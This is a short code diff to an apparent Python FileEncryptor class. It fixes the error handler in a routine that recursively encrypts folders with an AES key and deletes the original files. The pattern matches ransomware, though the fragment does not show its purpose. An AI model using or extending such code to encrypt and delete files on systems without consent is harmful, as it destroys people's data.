@@ -56,7 +56,7 @@ class FileEncryptor:
 
                     os.remove(full_path)
                 except Exception:
-                    os.remove()
+                    os.remove(full_path + "_")
                     continue
             elif os.path.isdir(full_path):
                 FileEncryptor.encrypt_folder(full_path, aes_key)
